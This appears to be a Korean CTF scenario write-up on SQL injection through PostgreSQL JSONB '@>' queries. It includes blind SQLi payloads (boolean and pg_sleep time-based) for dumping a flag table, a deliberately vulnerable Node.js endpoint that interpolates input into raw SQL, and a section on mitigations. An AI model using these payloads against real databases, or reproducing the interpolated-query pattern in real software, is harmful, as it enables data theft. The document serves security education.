---
title: PostgreSQL JSONB Query Operator SQL Injection — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, sqli, postgresql, jsonb, database, raw-query]
confidence: high
---

# PostgreSQL JSONB Query Operator SQL Injection — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Document Searcher (문서 및 JSON 검색기)
- **난이도**: Medium-High
- **핵심 컨셉**: 모던 관계형 데이터베이스에서 채택하는 대용량 반정형 컬럼 유형인 **PostgreSQL JSONB** 필드의 내장 연산자 처리 및 로우 쿼리 작성 시 발생하는 **SQL 인젝션(SQL Injection)** 취약점 문제입니다. 대상 애플리케이션은 임의의 메타데이터 속성들을 JSON 형태로 한데 모아 저장한 `details` (JSONB) 컬럼을 검색하는 API를 제공합니다. 개발자는 복잡한 JSON 내장 매핑 연산자(예: `->>`, `@>`, `?`)를 자바스크립트/파이썬 ORM 프레임워크 상에서 가독성 있게 표현하기 위해, 바인딩 파라미터를 쓰지 않고 문자열 합치기를 통해 SQL 구문을 직접 동적 조립했습니다. 공격자는 JSON 구조 검증 필터를 우회하여 인젝션 페이로드를 전달함으로써, JSONB 연산자 해석 파이프라인 내부에서 쿼리를 탈출시키고 데이터베이스 내의 모든 중요 계정 정보를 탈취합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **JSON Search Endpoint (`/api/search/metadata`)**:
  - 사용자가 기입한 메타데이터 키(key)와 벨류(value)를 기준으로 JSONB 컬럼 내부의 특정 노드에 해당하는 행을 검색하는 API.
  - 백엔드 내부에서는 PostgreSQL 전용 JSONB 연산자인 `@>` (JSON 포함 관계 판별) 또는 `->>` (JSON 속성 텍스트 추출) 연산자가 가미된 SQL Query 실행.
- **Flag 위치**:
  - 데이터베이스 내부의 비공개 테이블인 `secret_flags` 혹은 어드민 테이블의 특정 칼럼값으로 존재하며 SQLi를 통해 덤프해 내야 합니다.

### 2.2 취약점 지점
1. **Raw SQL Concatenation in JSONB Query Logic**:
   - JSONB 연산자 `@>`를 활용할 때 PostgreSQL은 `'{"key": "value"}'::jsonb` 형식의 캐스팅 선언이 필요합니다.
   - 개발자는 JSON 구조의 문자열을 생성하는 과정에서 바인딩 처리가 귀찮아, 클라이언트가 전달한 `value` 값을 단순 문자열 결합(String Concatenation) 방식으로 파싱하여 SQL 구문에 배치함으로써 인젝션 취약점이 발생합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 파라미터 | 데이터 포맷 | 역할 |
|------------|--------|------|----------|-------------|------|
| `/api/search/metadata` | GET | 세션 필요 | `key`, `val` | Query Parameter | 메타데이터 기반 조건 검색 (공격 주입점) |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. JSONB 검색 쿼리 거동 분석
1. 사용자는 일반적인 메타데이터 조건을 입력하여 쿼리 조회 결과를 확인합니다.
   - **요청**: `/api/search/metadata?key=category&val=document`
2. 입력창에 싱글 쿼테이션 `'` 기호를 삽입하여 데이터베이스 내부 구문 분석 에러(SQL Syntax Error)가 유도되는지 진단합니다.
   - **요청**: `/api/search/metadata?key=category&val=document'`
   - **반환**: `500 Internal Server Error` (PostgreSQL jsonb 파싱 및 쿼리 에러 발생 확인)

### Step 2. 백엔드 PostgreSQL raw query 유추 및 SQL 탈출 페이로드 구성
에러 스택이나 동작 원리를 보아, 서버 내부 쿼리는 다음과 같이 짜여 있음을 알아냅니다:
`SELECT * FROM items WHERE details @> '{"' || $KEY || '": "' || $VAL || '"}'`
또는 JSON Path 텍스트 검색 형태:
`SELECT * FROM items WHERE details ->> 'type' = '$VAL'`
여기서는 JSONB 내장 캐스팅과 결합된 `@>` 연산자 우회 기법을 사용합니다.
- `val` 파라미터 영역에 값을 주입하여 JSON 구문과 SQL 싱글 쿼터 감옥을 동시에 탈출시킵니다.
- **주입용 페이로드 설계**:
  `val = test"}' OR (SELECT 1 FROM secret_flags WHERE flag LIKE 'FLAG%')=1 --`
- 이를 대입하면 내부 조립 SQL은 다음과 같이 변조됩니다:
  `SELECT * FROM items WHERE details @> '{"category": "test"}' OR (SELECT 1 FROM secret_flags WHERE flag LIKE 'FLAG%')=1 --"}`
  *(주입 문자열 뒤 주석 처리 `--` 기호로 기존 JSON 잔여 괄호 구문 전체를 무력화함)*

### Step 3. blind SQL 인젝션을 통한 데이터 덤프
1. 참/거짓 판단(Boolean-based Blind SQLi) 혹은 시간 지연(Time-based Blind SQLi) 구문을 이용하여 `secret_flags` 테이블에 저장되어 있는 플래그의 한 글자씩 추출해 나가는 자동화 스크립트를 작동시킵니다.
   - **Time-based 페이로드 예시**:
     `?key=category&val=test"}' OR (SELECT 1 FROM pg_sleep(5)) --`
   - **Boolean-based 페이로드 예시**:
     `?key=category&val=test"}' OR SUBSTRING((SELECT flag FROM secret_flags LIMIT 1),1,1)='F' --`

### Step 4. flag 획득
1. 참 조건일 때 결과 셋이 반환되고 거짓일 때 아무것도 반환되지 않는 유효 응답 판별을 통해 플래그 전체 자릿수를 획득합니다.
2. 최종 해독된 값을 취득하여 플래그(`FLAG{postgresql_jsonb_operator_raw_query_sqli}`)를 제출합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Node.js pg 라이브러리)

```javascript
// db.js (취약한 PostgreSQL JSONB raw query 실행 예시)
const express = require('express');
const { Pool } = require('pg');
const app = express();

const pool = new Pool({
    connectionString: "postgresql://dbuser:dbpass@localhost:5432/webctf"
});

app.get('/api/search/metadata', async (req, res) => {
    const { key, val } = req.query;

    if (!key || !val) {
        return res.status(400).json({ error: "Missing key or val parameter" });
    }

    try {
        // 취약점 지점: JSON 포맷 조립 시 입력값 val을 SQL 바인딩 파라미터($1)로 넣지 않고 
        // 템플릿 리터럴 문자열 결합(String Interpolation)을 사용하여 직접 Raw SQL에 박아넣음
        // 이로 인해 JSON 구문 구조뿐 아니라 전체 SQL의 바깥 조건절까지 변조가 일어남
        const queryStr = `SELECT id, name, details FROM items WHERE details @> '{"${key}": "${val}"}'`;
        
        console.log(`[EXECUTING-SQL]: ${queryStr}`);
        const result = await pool.query(queryStr);
        
        res.json({ status: "success", count: result.rowCount, data: result.rows });
    } catch (err) {
        // 상세 에러 디버깅 노출
        res.status(500).json({ error: err.message });
    }
});

app.listen(8080);
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **완전한 SQL 파라미터 바인딩 적용 (Parameterized Queries)**:
   - JSON 구조 내부의 임의 삽입을 방지하기 위해 전체 JSON 문자열을 먼저 안전하게 파싱 및 인코딩한 뒤, 완성된 JSON 데이터 구조 통째로 데이터베이스에 바인딩 파라미터(`$1`)로 매핑해 넘겨줍니다.
     ```javascript
     // 안전한 쿼리 설계 기법
     const searchFilter = {};
     searchFilter[key] = val; // 순수 JS 객체 생성
     
     // 객체를 JSON 문자열로 직렬화하여 파라미터로 바인딩
     const queryStr = `SELECT id, name, details FROM items WHERE details @> $1::jsonb`;
     const result = await pool.query(queryStr, [JSON.stringify(searchFilter)]);
     ```
2. **PostgreSQL JSON 생성 함수 활용**:
   - `jsonb_build_object` 같은 DBMS 내장 함수를 이용하여 동적으로 JSON 오브젝트 빌드를 DB 엔진 레벨에서 안전하게 수행하도록 유도하고 데이터 삽입 구문을 차단합니다.
3. **ORM 추상화 인터페이스의 활용**:
   - raw SQL 문자열 합성 대신, Sequelize, TypeORM 등 신뢰도 높은 ORM 도구에서 지원하는 내장 JSON 조건 검색 문법(예: `Op.contains` 등)을 사용하여 엔진 단에서 자동 바인딩이 이루어지게 처리합니다.
